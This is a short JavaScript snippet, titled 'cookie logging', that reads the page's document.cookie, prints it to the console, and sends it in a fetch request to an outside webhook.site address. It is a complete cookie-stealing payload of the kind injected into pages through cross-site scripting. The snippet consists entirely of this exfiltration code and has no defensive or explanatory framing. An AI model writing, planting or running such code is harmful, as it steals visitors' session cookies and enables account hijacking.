// cookie logging
console.log("Cookies:", document.cookie);

fetch(
  "https://webhook.site/12cd4975-8ee7-43e3-addd-20f229f708c9?cookies=" +
    encodeURIComponent(document.cookie),
);
